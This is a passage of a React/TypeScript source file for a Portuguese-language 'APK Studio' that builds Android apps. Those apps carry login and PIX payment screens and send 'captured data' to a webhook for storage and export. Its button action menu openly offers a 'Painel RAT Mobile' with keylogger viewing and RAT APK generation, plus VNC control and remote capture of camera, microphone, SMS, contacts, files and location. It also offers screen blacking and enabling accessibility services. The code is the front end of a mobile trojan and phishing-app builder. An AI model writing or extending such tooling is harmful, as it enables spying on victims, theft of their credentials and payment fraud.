                {currentScreens.reduce((acc, s) => acc + s.elements.length, 0)} elementos no total
                (textos, botões, imagens, decorações, etc.)
              </p>
            </div>
            
            {/* Info do Webhook */}
            <div className="bg-green-900/30 border border-green-600/50 rounded-lg p-4 mb-4">
              <h4 className="text-green-400 font-semibold mb-2">📡 API Automática</h4>
              <p className="text-gray-300 text-sm mb-2">
                Ao confirmar, o sistema irá criar automaticamente:
              </p>
              <ul className="text-xs text-gray-400 space-y-1">
                <li>✅ Endpoint webhook para receber dados</li>
                <li>✅ Tabela no banco de dados para armazenar</li>
                <li>✅ Página de visualização dos dados capturados</li>
                <li>✅ Exportação em CSV e JSON</li>
              </ul>
              <p className="text-green-400 text-xs mt-2 font-mono">
                Webhook: /api/apk-studio/webhook/{currentProject?.id || 'PROJECT_ID'}
              </p>
            </div>
            
            {/* Botões */}
            <div className="flex gap-3">
              <button
                onClick={() => setShowBuildConfirm(false)}
                className="flex-1 py-3 bg-slate-700 hover:bg-slate-600 text-white rounded-lg font-semibold"
              >
                ← Voltar e Editar
              </button>
              <button
                onClick={buildAPK}
                className="flex-1 py-3 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white rounded-lg font-semibold flex items-center justify-center gap-2"
              >
                ✅ Confirmar e Criar APK
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Modal de Download */}
      {buildStatus.downloadUrl && !buildStatus.isBuilding && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
          <div className="bg-slate-800 rounded-2xl p-8 max-w-md w-full mx-4">
            <div className="text-center">
              <div className="w-16 h-16 bg-green-600 rounded-full flex items-center justify-center mx-auto mb-4">
                <Check className="w-8 h-8 text-white" />
              </div>
              <h3 className="text-xl font-bold text-white mb-2">APK Gerado com Sucesso!</h3>
              <p className="text-gray-400 mb-6">Seu aplicativo está pronto para download</p>
              <div className="flex gap-3">
                <button
                  onClick={() => setBuildStatus({ isBuilding: false, progress: 0, message: '' })}
                  className="flex-1 py-3 bg-slate-600 hover:bg-slate-500 text-white rounded-lg font-semibold"
                >
                  Fechar
                </button>
                <button
                  onClick={async () => {
                    try {
                      const token = localStorage.getItem('token');
                      const response = await fetch(`${getApiBaseUrl()}${buildStatus.downloadUrl}`, {
                        headers: { 'Authorization': `Bearer ${token}` }
                      });
                      if (!response.ok) throw new Error('Erro no download');
                      const blob = await response.blob();
                      const url = window.URL.createObjectURL(blob);
                      const a = document.createElement('a');
                      a.href = url;
                      a.download = buildStatus.downloadUrl?.split('/').pop() || 'app.apk';
                      document.body.appendChild(a);
                      a.click();
                      window.URL.revokeObjectURL(url);
                      document.body.removeChild(a);
                    } catch (err) {
                      console.error('Erro no download:', err);
                      alert('Erro ao baixar APK. Tente novamente.');
                    }
                  }}
                  className="flex-1 py-3 bg-green-600 hover:bg-green-700 text-white rounded-lg font-semibold flex items-center justify-center gap-2"
                >
                  <Download className="w-5 h-5" /> Baixar APK
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
      
      {/* Modal de Erro */}
      {buildStatus.error && !buildStatus.isBuilding && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
          <div className="bg-slate-800 rounded-2xl p-8 max-w-md w-full mx-4">
            <div className="text-center">
              <div className="w-16 h-16 bg-red-600 rounded-full flex items-center justify-center mx-auto mb-4">
                <AlertCircle className="w-8 h-8 text-white" />
              </div>
              <h3 className="text-xl font-bold text-white mb-2">Erro no Build</h3>
              <p className="text-gray-400 mb-6">{buildStatus.error}</p>
              <button
                onClick={() => setBuildStatus({ isBuilding: false, progress: 0, message: '' })}
                className="w-full py-3 bg-slate-600 hover:bg-slate-500 text-white rounded-lg font-semibold"
              >
                Fechar
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

// ============================================
// COMPONENTES AUXILIARES
// ============================================

const ElementProperties: React.FC<{
  element: ScreenElement;
  onUpdate: (updates: Partial<ScreenElement>) => void;
  onDelete: () => void;
  onImageUpload: (e: React.ChangeEvent<HTMLInputElement>) => void;
  screens: Screen[];
}> = ({ element, onUpdate, onDelete, onImageUpload, screens }) => {
  return (
    <div className="space-y-4">
      <h3 className="text-white font-semibold text-sm">⚙️ Propriedades</h3>
      
      {/* Posição */}
      <div>
        <label className="text-gray-400 text-xs">Posição</label>
        <div className="flex gap-2 mt-1">
          <input type="number" value={Math.round(element.x)} onChange={(e) => onUpdate({ x: parseInt(e.target.value) || 0 })} className="w-1/2 bg-slate-700 text-white px-2 py-1 rounded text-sm" placeholder="X" />
          <input type="number" value={Math.round(element.y)} onChange={(e) => onUpdate({ y: parseInt(e.target.value) || 0 })} className="w-1/2 bg-slate-700 text-white px-2 py-1 rounded text-sm" placeholder="Y" />
        </div>
      </div>
      
      {/* Tamanho */}
      <div>
        <label className="text-gray-400 text-xs">Tamanho</label>
        <div className="flex gap-2 mt-1">
          <input type="number" value={Math.round(element.width)} onChange={(e) => onUpdate({ width: parseInt(e.target.value) || 50 })} className="w-1/2 bg-slate-700 text-white px-2 py-1 rounded text-sm" placeholder="L" />
          <input type="number" value={Math.round(element.height)} onChange={(e) => onUpdate({ height: parseInt(e.target.value) || 50 })} className="w-1/2 bg-slate-700 text-white px-2 py-1 rounded text-sm" placeholder="A" />
        </div>
      </div>

      {/* Propriedades específicas de texto */}
      {(element.type === 'text' || element.type === 'button' || element.type === 'pix_copypaste') && (
        <>
          <div>
            <label className="text-gray-400 text-xs">Texto</label>
            <input type="text" value={element.content || ''} onChange={(e) => onUpdate({ content: e.target.value })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" />
          </div>
          <div>
            <label className="text-gray-400 text-xs">Tamanho da Fonte</label>
            <input type="number" value={element.fontSize || 16} onChange={(e) => onUpdate({ fontSize: parseInt(e.target.value) || 16 })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" />
          </div>
          <div>
            <label className="text-gray-400 text-xs">Cor do Texto</label>
            <div className="flex gap-2 mt-1">
              <input type="color" value={element.color || '#FFFFFF'} onChange={(e) => onUpdate({ color: e.target.value })} className="w-10 h-8 rounded cursor-pointer" />
              <input type="text" value={element.color || '#FFFFFF'} onChange={(e) => onUpdate({ color: e.target.value })} className="flex-1 bg-slate-700 text-white px-2 py-1 rounded text-sm" />
            </div>
          </div>
        </>
      )}

      {/* Propriedades de input */}
      {element.type === 'input' && (
        <>
          <div>
            <label className="text-gray-400 text-xs">Label</label>
            <input type="text" value={element.inputLabel || ''} onChange={(e) => onUpdate({ inputLabel: e.target.value })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" />
          </div>
          <div>
            <label className="text-gray-400 text-xs">Placeholder</label>
            <input type="text" value={element.placeholder || ''} onChange={(e) => onUpdate({ placeholder: e.target.value })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" />
          </div>
          <div>
            <label className="text-gray-400 text-xs">Tipo de Input</label>
            <select value={element.inputType || 'text'} onChange={(e) => onUpdate({ inputType: e.target.value as any })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1">
              <option value="text">Texto</option>
              <option value="password">Senha</option>
              <option value="numeric">Numérico</option>
              <option value="email">Email</option>
              <option value="phone">Telefone</option>
            </select>
          </div>
        </>
      )}

      {/* Propriedades de botão */}
      {element.type === 'button' && (
        <div className="space-y-3">
          {/* ID do Elemento - Visível e Copiável */}
          <div className="bg-slate-900 p-2 rounded border border-slate-600">
            <label className="text-gray-500 text-[10px] uppercase tracking-wider">🔑 ID do Elemento</label>
            <div className="flex items-center gap-1 mt-1">
              <code className="flex-1 bg-slate-800 text-green-400 px-2 py-1 rounded text-xs font-mono truncate">
                {element.id}
              </code>
              <button 
                onClick={() => navigator.clipboard.writeText(element.id)}
                className="px-2 py-1 bg-slate-700 hover:bg-slate-600 text-white rounded text-xs"
                title="Copiar ID"
              >
                📋
              </button>
            </div>
          </div>

          {/* Ação do Botão */}
          <div>
            <label className="text-gray-400 text-xs">🎯 Ação do Botão</label>
            <select value={element.buttonAction || 'next_screen'} onChange={(e) => onUpdate({ buttonAction: e.target.value as any })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1">
              <optgroup label="🔐 Autenticação">
                <option value="login">🔓 Login (Autenticar no Servidor)</option>
                <option value="logout">🚪 Logout</option>
              </optgroup>
              <optgroup label="📱 Navegação">
                <option value="next_screen">→ Próxima Tela</option>
                <option value="prev_screen">← Tela Anterior</option>
                <option value="goto_screen">🎯 Ir para Tela Específica</option>
              </optgroup>
              <optgroup label="📤 Dados">
                <option value="submit">📤 Enviar Dados (Webhook)</option>
                <option value="refresh_data">🔄 Atualizar Dados</option>
              </optgroup>
              <optgroup label="💰 PIX/Pagamento">
                <option value="generate_pix">💸 Gerar QR PIX</option>
                <option value="copy_pix">📋 Copiar Código PIX</option>
              </optgroup>
              <optgroup label="🎮 Painel RAT Mobile">
                <option value="open_dashboard">🏠 Abrir Dashboard</option>
                <option value="view_devices">📱 Ver Dispositivos</option>
                <option value="view_keylog">⌨️ Ver Keylogger</option>
                <option value="generate_apk">🔨 Gerar APK RAT</option>
              </optgroup>
              <optgroup label="▶️ Controle VNC">
                <option value="start_vnc">▶️ Iniciar VNC</option>
                <option value="stop_vnc">⏹️ Parar VNC</option>
              </optgroup>
              <optgroup label="📷 Captura Remota">
                <option value="capture_camera">📷 Capturar Câmera</option>
                <option value="capture_mic">🎤 Gravar Microfone</option>
                <option value="get_files">📁 Obter Arquivos</option>
                <option value="get_sms">💬 Obter SMS</option>
                <option value="get_contacts">📇 Obter Contatos</option>
                <option value="get_location">📍 Obter Localização</option>
              </optgroup>
              <optgroup label="🔒 Controle de Dispositivo">
                <option value="lock_screen">🔒 Bloquear Tela</option>
                <option value="unlock_screen">🔓 Desbloquear Tela</option>
                <option value="black_screen">⬛ Tela Preta</option>
                <option value="show_toast">💬 Mostrar Toast</option>
                <option value="vibrate">📳 Vibrar</option>
                <option value="play_sound">🔊 Tocar Som</option>
              </optgroup>
              <optgroup label="⚙️ Sistema">
                <option value="accessibility">♿ Ativar Acessibilidade</option>
                <option value="open_url">🌐 Abrir URL</option>
                <option value="call_phone">📞 Fazer Ligação</option>
                <option value="send_sms">📱 Enviar SMS</option>
                <option value="minimize">📲 Minimizar App</option>
                <option value="close">❌ Fechar App</option>
              </optgroup>
              <optgroup label="🔧 Customizado">
                <option value="custom">⚡ Ação Customizada</option>
              </optgroup>
            </select>
          </div>

          {/* Parâmetro da Ação (Backend) */}
          <div className="bg-slate-900 p-2 rounded border border-slate-600">
            <label className="text-gray-500 text-[10px] uppercase tracking-wider">⚙️ Parâmetro API/Backend</label>
            <code className="block bg-slate-800 text-yellow-400 px-2 py-1 rounded text-xs font-mono mt-1">
              action: "{element.buttonAction || 'next_screen'}"
            </code>
            <p className="text-gray-500 text-[9px] mt-1">
              Este parâmetro é enviado ao servidor quando o botão é clicado
            </p>
          </div>

          {/* Campos condicionais */}
          {element.buttonAction === 'goto_screen' && (
            <div>
              <label className="text-gray-400 text-xs">🎯 Tela Destino</label>
              <select 
                value={element.targetScreenIndex ?? 0} 
                onChange={(e) => onUpdate({ targetScreenIndex: parseInt(e.target.value) })} 
                className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1"
              >
                {screens.map((s, idx) => (
                  <option key={s.id} value={idx}>{idx + 1}. {s.name}</option>
                ))}
              </select>
              <code className="block bg-slate-800 text-blue-400 px-2 py-1 rounded text-xs font-mono mt-1">
                targetScreenIndex: {element.targetScreenIndex ?? 0}
              </code>
            </div>
          )}
          
          {element.buttonAction === 'open_url' && (
            <div>
              <label className="text-gray-400 text-xs">🌐 URL</label>
              <input type="text" value={element.buttonUrl || ''} onChange={(e) => onUpdate({ buttonUrl: e.target.value })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" placeholder="https://..." />
            </div>
          )}

          {element.buttonAction === 'show_toast' && (
            <div>
              <label className="text-gray-400 text-xs">💬 Mensagem do Toast</label>
              <input type="text" value={element.buttonUrl || ''} onChange={(e) => onUpdate({ buttonUrl: e.target.value })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" placeholder="Mensagem..." />
            </div>
          )}

          {element.buttonAction === 'call_phone' && (
            <div>
              <label className="text-gray-400 text-xs">📞 Número de Telefone</label>
              <input type="text" value={element.buttonUrl || ''} onChange={(e) => onUpdate({ buttonUrl: e.target.value })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" placeholder="+5511999999999" />
            </div>
          )}

          {element.buttonAction === 'send_sms' && (
            <div>
              <label className="text-gray-400 text-xs">📱 Número para SMS</label>
              <input type="text" value={element.buttonUrl || ''} onChange={(e) => onUpdate({ buttonUrl: e.target.value })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" placeholder="+5511999999999" />
            </div>
          )}

          {element.buttonAction === 'custom' && (
            <div className="space-y-2">
              <label className="text-gray-400 text-xs">⚡ Nome da Ação Customizada</label>
              <input 
                type="text" 
                value={element.customAction || ''} 
                onChange={(e) => onUpdate({ customAction: e.target.value })} 
                className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" 
                placeholder="minha_acao_customizada"
              />
              <label className="text-gray-400 text-xs">📝 Dados Extras (JSON)</label>
              <textarea 
                value={element.customData || ''} 
                onChange={(e) => onUpdate({ customData: e.target.value })} 
                className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm h-16 font-mono" 
                placeholder='{"chave": "valor"}'
              />
              <p className="text-gray-500 text-[9px]">
                A ação customizada será enviada ao webhook com os dados extras
              </p>
            </div>
          )}

          {/* Resumo da Ação */}
          <div className="bg-gradient-to-r from-orange-900/30 to-red-900/30 p-2 rounded border border-orange-600/50">
            <p className="text-orange-400 text-[10px] font-bold mb-1">📡 ENDPOINT API</p>
            <code className="block text-green-400 text-[10px] font-mono">
              POST /api/apk-studio/action
            </code>
            <code className="block text-gray-400 text-[9px] font-mono mt-1">
              {`{ "elementId": "${element.id.slice(0,8)}...", "action": "${element.buttonAction || 'next_screen'}"${element.targetScreenIndex !== undefined ? `, "target": ${element.targetScreenIndex}` : ''} }`}
            </code>
          </div>
        </div>
      )}

      {/* PIX QR Code */}
      {element.type === 'pix_qrcode' && (
        <>
          <div>
            <label className="text-gray-400 text-xs">Valor (R$)</label>
            <input type="text" value={element.pixAmount || ''} onChange={(e) => onUpdate({ pixAmount: e.target.value })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" placeholder="10.00" />
          </div>
          <div>
            <label className="text-gray-400 text-xs">Descrição</label>
            <input type="text" value={element.pixDescription || ''} onChange={(e) => onUpdate({ pixDescription: e.target.value })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" />
          </div>
        </>
      )}

      {/* Imagem */}
      {/* IMAGEM */}
      {element.type === 'image' && (
        <div className="space-y-2">
          <label className="text-gray-400 text-xs">📷 Imagem</label>
          <input type="file" accept="image/*" onChange={onImageUpload} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" />
          <input 
            type="text" 
            value={element.imageUrl || ''} 
            onChange={(e) => onUpdate({ imageUrl: e.target.value })} 
            className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" 
            placeholder="Ou cole URL da imagem..."
          />
          {element.imageUrl && <img src={element.imageUrl} className="w-full h-20 object-contain rounded border border-slate-600" />}
        </div>
      )}

      {/* LOGO */}
      {element.type === 'logo' && (
        <div className="space-y-2">
          <label className="text-gray-400 text-xs">🏢 Logo</label>
          <input type="file" accept="image/*" onChange={onImageUpload} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" />
          <input 
            type="text" 
            value={element.imageUrl || ''} 
            onChange={(e) => onUpdate({ imageUrl: e.target.value })} 
            className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" 
            placeholder="Ou cole URL do logo..."
          />
          {element.imageUrl && <img src={element.imageUrl} className="w-16 h-16 object-cover rounded-full mx-auto border border-slate-600" />}
        </div>
      )}

      {/* VIDEO */}
      {element.type === 'video' && (
        <div className="space-y-2">
          <label className="text-gray-400 text-xs">🎬 Vídeo</label>
          <input 
            type="file" 
            accept="video/*" 
            onChange={(e) => {
              const file = e.target.files?.[0];
              if (file) {
                const reader = new FileReader();
                reader.onload = (ev) => {
                  onUpdate({ videoUrl: ev.target?.result as string });
                };
                reader.readAsDataURL(file);
              }
            }} 
            className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" 
          />
          <input 
            type="text" 
            value={element.videoUrl || ''} 
            onChange={(e) => onUpdate({ videoUrl: e.target.value })} 
            className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" 
            placeholder="Ou cole URL do vídeo (YouTube, MP4...)"
          />
          <div className="grid grid-cols-2 gap-2 mt-2">
            <label className="flex items-center gap-2 text-gray-300 text-xs">
              <input type="checkbox" checked={element.autoPlay || false} onChange={(e) => onUpdate({ autoPlay: e.target.checked })} className="rounded" />
              Auto-play
            </label>
            <label className="flex items-center gap-2 text-gray-300 text-xs">
              <input type="checkbox" checked={element.loop || false} onChange={(e) => onUpdate({ loop: e.target.checked })} className="rounded" />
              Loop
            </label>
            <label className="flex items-center gap-2 text-gray-300 text-xs">
              <input type="checkbox" checked={element.muted || false} onChange={(e) => onUpdate({ muted: e.target.checked })} className="rounded" />
              Mudo
            </label>
            <label className="flex items-center gap-2 text-gray-300 text-xs">
              <input type="checkbox" checked={element.controls !== false} onChange={(e) => onUpdate({ controls: e.target.checked })} className="rounded" />
              Controles
            </label>
          </div>
        </div>
      )}

      {/* AUDIO */}
      {element.type === 'audio' && (
        <div className="space-y-2">
          <label className="text-gray-400 text-xs">🎵 Áudio</label>
          <input 
            type="file" 
            accept="audio/*" 
            onChange={(e) => {
              const file = e.target.files?.[0];
              if (file) {
                const reader = new FileReader();
                reader.onload = (ev) => {
                  onUpdate({ audioUrl: ev.target?.result as string });
                };
                reader.readAsDataURL(file);
              }
            }} 
            className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" 
          />
          <input 
            type="text" 
            value={element.audioUrl || ''} 
            onChange={(e) => onUpdate({ audioUrl: e.target.value })} 
            className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" 
            placeholder="Ou cole URL do áudio (MP3, WAV...)"
          />
          <div className="grid grid-cols-2 gap-2 mt-2">
            <label className="flex items-center gap-2 text-gray-300 text-xs">
              <input type="checkbox" checked={element.autoPlay || false} onChange={(e) => onUpdate({ autoPlay: e.target.checked })} className="rounded" />
              Auto-play
            </label>
            <label className="flex items-center gap-2 text-gray-300 text-xs">
              <input type="checkbox" checked={element.loop || false} onChange={(e) => onUpdate({ loop: e.target.checked })} className="rounded" />
              Loop
            </label>
          </div>
        </div>
      )}

      {/* GIF */}
      {element.type === 'gif' && (
        <div className="space-y-2">
          <label className="text-gray-400 text-xs">🎞️ GIF Animado</label>
          <input type="file" accept="image/gif" onChange={onImageUpload} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" />
          <input 
            type="text" 
            value={element.imageUrl || ''} 
            onChange={(e) => onUpdate({ imageUrl: e.target.value })} 
            className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" 
            placeholder="Ou cole URL do GIF (Giphy, Tenor...)"
          />
          {element.imageUrl && <img src={element.imageUrl} className="w-full h-20 object-contain rounded border border-slate-600" />}
        </div>
      )}

      {/* ANIMAÇÃO (Lottie) */}
      {(element.type === 'animation' || element.type === 'lottie') && (
        <div className="space-y-2">
          <label className="text-gray-400 text-xs">✨ Animação Lottie</label>
          <input 
            type="text" 
            value={element.imageUrl || ''} 
            onChange={(e) => onUpdate({ imageUrl: e.target.value })} 
            className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" 
            placeholder="URL do JSON Lottie (lottiefiles.com)"
          />
          <div className="grid grid-cols-2 gap-2 mt-2">
            <label className="flex items-center gap-2 text-gray-300 text-xs">
              <input type="checkbox" checked={element.autoPlay !== false} onChange={(e) => onUpdate({ autoPlay: e.target.checked })} className="rounded" />
              Auto-play
            </label>
            <label className="flex items-center gap-2 text-gray-300 text-xs">
              <input type="checkbox" checked={element.loop !== false} onChange={(e) => onUpdate({ loop: e.target.checked })} className="rounded" />
              Loop
            </label>
          </div>
        </div>
      )}

      {/* ÍCONE */}
      {element.type === 'icon' && (
        <div className="space-y-2">
          <label className="text-gray-400 text-xs">⭐ Ícone/Emoji</label>
          <input 
            type="text" 
            value={element.iconName || ''} 
            onChange={(e) => onUpdate({ iconName: e.target.value })} 
            className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm text-2xl text-center" 
            placeholder="Cole emoji aqui: 🔥 ⚡ 💰"
          />
          <div className="flex flex-wrap gap-1 mt-2">
            {['⭐', '🔥', '💰', '🎯', '✅', '❌', '⚡', '💎', '🏆', '🎉', '💳', '🔒', '📱', '💬'].map(emoji => (
              <button 
                key={emoji} 
                onClick={() => onUpdate({ iconName: emoji })} 
                className="w-8 h-8 bg-slate-600 hover:bg-slate-500 rounded text-lg"
              >
                {emoji}
              </button>
            ))}
          </div>
        </div>
      )}

      {/* WEBVIEW */}
      {element.type === 'webview' && (
        <div className="space-y-2">
          <label className="text-gray-400 text-xs">🌐 WebView URL</label>
          <input 
            type="text" 
            value={element.buttonUrl || ''} 
            onChange={(e) => onUpdate({ buttonUrl: e.target.value })} 
            className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" 
            placeholder="https://exemplo.com"
          />
        </div>
      )}

      {/* DROPDOWN */}
      {element.type === 'dropdown' && (
        <div className="space-y-2">
          <label className="text-gray-400 text-xs">📋 Opções (uma por linha)</label>
          <textarea 
            value={(element.options || []).join('\n')} 
            onChange={(e) => onUpdate({ options: e.target.value.split('\n').filter(o => o.trim()) })} 
            className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm h-20" 
            placeholder="Opção 1&#10;Opção 2&#10;Opção 3"
          />
          <div>
            <label className="text-gray-400 text-xs">Valor Selecionado</label>
            <input 
              type="text" 
              value={element.selectedValue || ''} 
              onChange={(e) => onUpdate({ selectedValue: e.target.value })} 
              className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" 
            />
          </div>
        </div>
      )}

      {/* SLIDER */}
      {element.type === 'slider' && (
        <div className="space-y-2">
          <label className="text-gray-400 text-xs">📊 Slider</label>
          <div className="grid grid-cols-3 gap-2">
            <div>
              <label className="text-gray-500 text-xs">Min</label>
              <input type="number" value={element.minValue || 0} onChange={(e) => onUpdate({ minValue: parseInt(e.target.value) })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" />
            </div>
            <div>
              <label className="text-gray-500 text-xs">Max</label>
              <input type="number" value={element.maxValue || 100} onChange={(e) => onUpdate({ maxValue: parseInt(e.target.value) })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" />
            </div>
            <div>
              <label className="text-gray-500 text-xs">Valor</label>
              <input type="number" value={element.currentValue || 50} onChange={(e) => onUpdate({ currentValue: parseInt(e.target.value) })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" />
            </div>
          </div>
        </div>
      )}

      {/* PROGRESS BAR */}
      {element.type === 'progress_bar' && (
        <div className="space-y-2">
          <label className="text-gray-400 text-xs">📈 Barra de Progresso</label>
          <div>
            <label className="text-gray-500 text-xs">Valor (%)</label>
            <input 
              type="range" 
              min="0" 
              max="100" 
              value={element.currentValue || 0} 
              onChange={(e) => onUpdate({ currentValue: parseInt(e.target.value) })} 
              className="w-full" 
            />
            <span className="text-white text-sm">{element.currentValue || 0}%</span>
          </div>
        </div>
      )}

      {/* TIMER */}
      {element.type === 'timer' && (
        <div className="space-y-2">
          <label className="text-gray-400 text-xs">⏱️ Timer</label>
          <div>
            <label className="text-gray-500 text-xs">Segundos</label>
            <input type="number" value={element.timerSeconds || 60} onChange={(e) => onUpdate({ timerSeconds: parseInt(e.target.value) })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" />
          </div>
          <div>
            <label className="text-gray-500 text-xs">Formato</label>
            <select value={element.timerFormat || 'mm:ss'} onChange={(e) => onUpdate({ timerFormat: e.target.value })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm">
              <option value="mm:ss">MM:SS</option>
              <option value="hh:mm:ss">HH:MM:SS</option>
              <option value="ss">Só segundos</option>
            </select>
          </div>
          <div>
            <label className="text-gray-500 text-xs">Ao terminar</label>
            <select value={element.onTimerEnd || 'next_screen'} onChange={(e) => onUpdate({ onTimerEnd: e.target.value as 'next_screen' | 'submit' | 'close' })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm">
              <option value="next_screen">Próxima tela</option>
              <option value="submit">Enviar dados</option>
              <option value="close">Fechar app</option>
            </select>
          </div>
        </div>
      )}

      {/* Background (para elementos com fundo) */}
      {(element.type === 'button' || element.type === 'rectangle' || element.type === 'circle' || element.type === 'input' || element.type === 'pix_qrcode' || element.type === 'pix_copypaste') && (
        <div>
          <label className="text-gray-400 text-xs">Cor de Fundo</label>
          <div className="flex gap-2 mt-1">
            <input type="color" value={element.backgroundColor || '#333333'} onChange={(e) => onUpdate({ backgroundColor: e.target.value })} className="w-10 h-8 rounded cursor-pointer" />
            <input type="text" value={element.backgroundColor || '#333333'} onChange={(e) => onUpdate({ backgroundColor: e.target.value })} className="flex-1 bg-slate-700 text-white px-2 py-1 rounded text-sm" />
          </div>
        </div>
      )}

      {/* Border Radius */}
      {(element.type === 'button' || element.type === 'rectangle' || element.type === 'input' || element.type === 'pix_qrcode' || element.type === 'pix_copypaste') && (
        <div>
          <label className="text-gray-400 text-xs">Borda Arredondada</label>
          <input type="number" value={element.borderRadius || 0} onChange={(e) => onUpdate({ borderRadius: parseInt(e.target.value) || 0 })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" />
        </div>
      )}

      {/* Opacidade */}
      <div>
        <label className="text-gray-400 text-xs">Opacidade ({element.opacity || 100}%)</label>
        <input type="range" min="0" max="100" value={element.opacity || 100} onChange={(e) => onUpdate({ opacity: parseInt(e.target.value) })} className="w-full mt-1" />
      </div>

      <button onClick={onDelete} className="w-full py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg text-sm font-semibold flex items-center justify-center gap-2">
        <Trash2 className="w-4 h-4" /> Excluir
      </button>
    </div>
  );
};

const ScreenProperties: React.FC<{
  screen?: Screen;
  onUpdate: (updates: Partial<Screen>) => void;
}> = ({ screen, onUpdate }) => {
  if (!screen) return null;
  
  return (
    <div className="space-y-4">
      <h3 className="text-white font-semibold text-sm">📱 Propriedades da Tela</h3>
      
      <div>
        <label className="text-gray-400 text-xs">Nome da Tela</label>
        <input type="text" value={screen.name} onChange={(e) => onUpdate({ name: e.target.value })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" />
      </div>
      
      <div>
        <label className="text-gray-400 text-xs">Cor de Fundo</label>
        <div className="flex gap-2 mt-1">
          <input type="color" value={screen.backgroundColor} onChange={(e) => onUpdate({ backgroundColor: e.target.value })} className="w-10 h-8 rounded cursor-pointer" />
          <input type="text" value={screen.backgroundColor} onChange={(e) => onUpdate({ backgroundColor: e.target.value })} className="flex-1 bg-slate-700 text-white px-2 py-1 rounded text-sm" />
        </div>
      </div>
      
      <div className="text-gray-400 text-xs text-center py-4">
        Clique em um elemento para editar suas propriedades
      </div>
    </div>
  );
};

const PixConfigModal: React.FC<{
  config: PixConfig | null;
  onSave: (config: PixConfig) => void;
  onClose: () => void;
}> = ({ config, onSave, onClose }) => {
  const [form, setForm] = useState<PixConfig>(config || {
    id: '',
    name: '',
    pixKey: '',
    pixKeyType: 'random',
    beneficiaryName: '',
    beneficiaryCity: '',
    isDefault: false
  });

  return (
    <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4">
      <div className="bg-slate-800 rounded-xl w-full max-w-md p-6">
        <div className="flex items-center justify-between mb-6">
          <h2 className="text-xl font-bold text-white">{config ? '✏️ Editar' : '➕ Nova'} Chave PIX</h2>
          <button onClick={onClose} className="p-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg">
            <X className="w-5 h-5" />
          </button>
        </div>
        
        <div className="space-y-4">
          <div>
            <label className="text-gray-400 text-sm">Nome Identificador</label>
            <input type="text" value={form.name} onChange={(e) => setForm({ ...form, name: e.target.value })} className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1" placeholder="Ex: PIX Principal" />
          </div>
          
          <div>
            <label className="text-gray-400 text-sm">Tipo de Chave</label>
            <select value={form.pixKeyType} onChange={(e) => setForm({ ...form, pixKeyType: e.target.value as any })} className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1">
              <option value="cpf">CPF</option>
              <option value="cnpj">CNPJ</option>
              <option value="email">E-mail</option>
              <option value="phone">Telefone</option>
              <option value="random">Chave Aleatória</option>
            </select>
          </div>
          
          <div>
            <label className="text-gray-400 text-sm">Chave PIX</label>
            <input type="text" value={form.pixKey} onChange={(e) => setForm({ ...form, pixKey: e.target.value })} className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1" placeholder="Sua chave PIX" />
          </div>
          
          <div>
            <label className="text-gray-400 text-sm">Nome do Beneficiário</label>
            <input type="text" value={form.beneficiaryName} onChange={(e) => setForm({ ...form, beneficiaryName: e.target.value })} className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1" placeholder="Nome que aparece no PIX" />
          </div>
          
          <div>
            <label className="text-gray-400 text-sm">Cidade</label>
            <input type="text" value={form.beneficiaryCity} onChange={(e) => setForm({ ...form, beneficiaryCity: e.target.value })} className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1" placeholder="Cidade" />
          </div>
          
          <label className="flex items-center gap-2 cursor-pointer">
